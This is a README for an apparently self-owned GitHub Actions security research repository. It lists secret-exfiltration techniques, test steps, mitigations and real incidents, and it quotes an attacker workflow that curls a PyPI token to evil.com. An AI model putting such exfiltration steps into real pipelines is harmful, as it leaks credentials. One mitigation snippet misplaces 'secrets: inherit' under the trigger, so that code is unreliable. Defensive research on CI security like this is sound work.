# GitHub Actions Security Research

⚠️ **IMPORTANT**: This repository contains security research materials for **educational and authorized testing purposes only**.

## Purpose

This repository demonstrates how GitHub Actions workflows can be exploited to exfiltrate repository secrets through Pull Requests. This research is inspired by real-world attacks including:

- **GhostAction Campaign (Sept 2025)** - 3,325 secrets stolen from 817 repositories
- **PostHog/Shai-Hulud Attack (Nov 2025)** - Supply chain attack via CI/CD compromise
- **Orca Security's pull_request_nightmare** - Compromised Microsoft, Google, Nvidia repos

## Authorization

- **Owner**: Emmanuel
- **Pentester**: Emmanuel
- **Status**: Authorized security testing on own repository

## What This Demonstrates

This repository contains workflows and documentation that demonstrate 12+ attack vectors:

1. **Direct Secret Printing** - Printing secrets to workflow logs
2. **HTTP Exfiltration** - Sending secrets to external servers
3. **DNS Exfiltration** - Covert DNS-based exfiltration
4. **Environment Dumping** - Capturing all environment variables
5. **GitHub Context Injection** - Extracting repository metadata
6. **Parameter Injection** - Abusing action parameters
7. **Secret Enumeration** - Discovering secret names from workflows
8. **Composite Action Hijacking** - Exploiting reusable actions
9. **Workflow Reuse Abuse** - Bypassing restrictions with `secrets: inherit`
10. **Cache Poisoning** - Storing secrets in workflow caches
11. **Self-Hosted Runner Exploitation** - Escaping runner sandbox
12. **PR Workflow Tampering** - Modifying existing workflows

## Files

- `SECURITY_RESEARCH_STRATEGY.md` - Comprehensive attack vector documentation
- `.github/workflows/security-research.yml` - Test workflow demonstrating all vectors
- `.github/workflows/test.yml` - Original simple test workflow (safe)

## How to Test

### Step 1: Create a Test Branch

```bash
git checkout -b security-research-test
git add .github/workflows/security-research.yml
git commit -m "Add security research workflow"
git push origin security-research-test
```

### Step 2: Open a Pull Request

Create a PR from your test branch to `main`. The `security-research.yml` workflow will run automatically on the PR.

### Step 3: Analyze Results

1. **Check Workflow Logs** - Go to the Actions tab and view the workflow run
2. **Review Artifacts** - Download the environment dump artifact
3. **Search for Secrets** - Look for any exposed secret values in logs
4. **Document Findings** - Record which attack vectors succeeded

### Step 4: Clean Up

After testing:

```bash
git checkout main
git branch -D security-research-test
git push origin --delete security-research-test
# Close and delete the PR
```

## Safety Guidelines

✅ **DO:**
- Test only on repositories you own
- Use fake/dummy secrets for testing
- Monitor your workflows during testing
- Document findings responsibly
- Share knowledge with security community
- Report vulnerabilities to maintainers

❌ **DON'T:**
- Test on repositories you don't own without authorization
- Publish real secrets from other repositories
- Use these techniques maliciously
- Damage production systems
- Share stolen secrets publicly
- Evade legal or ethical boundaries

## Key Findings

### Why These Attacks Work

1. **Secrets as Environment Variables** - GitHub injects secrets as environment variables in workflows
2. **Pull Request Workflows** - Workflows triggered by PRs often inherit repository secrets
3. **Lax Permissions** - Many workflows have excessive permissions
4. **Secret Inheritance** - `secrets: inherit` passes ALL secrets to reusable workflows
5. **Network Access** - Runners typically have full outbound internet access
6. **Log Exposure** - Logs may reveal secrets before GitHub's masking kicks in

### Mitigation Strategies

#### Immediate Actions

1. **Restrict Workflow Permissions**
```yaml
jobs:
  test:
    permissions:
      contents: read
```

2. **Disable Secret Inheritance on PR Workflows**
```yaml
on:
  pull_request:
    types: [opened, synchronize]
    secrets: inherit  # REMOVE THIS LINE
```

3. **Add Repository Restrictions**
```yaml
jobs:
  test:
    if: github.repository == 'your-org/repo'
```

#### Long-term Security Measures

1. **Enable GitHub Advanced Security**
   - Secret scanning in code and workflows
   - Dependency scanning
   - CodeQL analysis

2. **Implement Branch Protection**
   - Require PR reviews
   - Require status checks to pass
   - Restrict who can push

3. **Use Environment Protection Rules**
   - Require manual approval for production deployments
   - Restrict who can trigger production workflows

4. **Network Controls**
   - Block unnecessary outbound domains
   - Use private networks for runners
   - Implement DNS filtering

5. **Monitor and Alert**
   - Set up alerts for workflow creation/modification
   - Monitor for suspicious outbound connections
   - Review all PR workflow changes

6. **Secret Rotation**
   - Regularly rotate all secrets
   - Use short-lived tokens
   - Implement secret versioning

## Real-World Examples

### GhostAction Campaign

Attackers added malicious workflows with commit message "Add Github Actions Security workflow":

```yaml
name: Github Actions Security
on:
  workflow_dispatch:
  push:
jobs:
  send-secrets:
    runs-on: ubuntu-latest
    steps:
      - name: Exfiltrate secrets
        run: |
          curl -X POST https://evil.com/steal \
            -d 'PYPI_API_TOKEN=${{ secrets.PYPI_API_TOKEN }}'
```

**Impact**: 3,325 secrets stolen from 817 repositories

### Shai-Hulud Attack

Attackers compromised CI/CD workflows and published malicious packages with preinstall scripts that used Trufflehog to scan for and exfiltrate credentials.

**Impact**: PostHog, AsyncAPI, Postman, and many others compromised

## Testing Checklist

When testing this repository:

- [ ] Create test branch with security-research workflow
- [ ] Open PR from test branch
- [ ] Monitor workflow execution
- [ ] Review all job logs for exposed data
- [ ] Download and check artifacts
- [ ] Test each attack vector independently
- [ ] Document successful exfiltration methods
- [ ] Test mitigation strategies
- [ ] Clean up test PR and branch
- [ ] Share findings with team

## Resources

- [GitHub Security Advisory: Workflow Injection](https://github.com/security/advisories)
- [How to catch GitHub Actions workflow injections](https://github.blog/security/vulnerability-research/how-to-catch-github-actions-workflow-injections-before-attackers-do)
- [Hardening GitHub Actions: Lessons from Recent Attacks](https://www.wiz.io/blog/github-actions-security-guide)
- [The GhostAction Campaign: 3,325 Secrets Stolen](https://blog.gitguardian.com/ghostaction-campaign-3-325-secrets-stolen/)
- [pull_request_nightmare Part 2](https://orca.security/resources/blog/pull-request-nightmare-part-2-exploits/)

## Disclaimer

This research is provided for **educational purposes only** and should only be used on repositories you own or have explicit authorization to test. The author assumes no responsibility for misuse of this information.

## License

This security research material is provided as-is for educational purposes.

---

**Remember**: Security research is only ethical when done responsibly. Always obtain proper authorization before testing, and disclose vulnerabilities responsibly to help make the ecosystem safer for everyone.
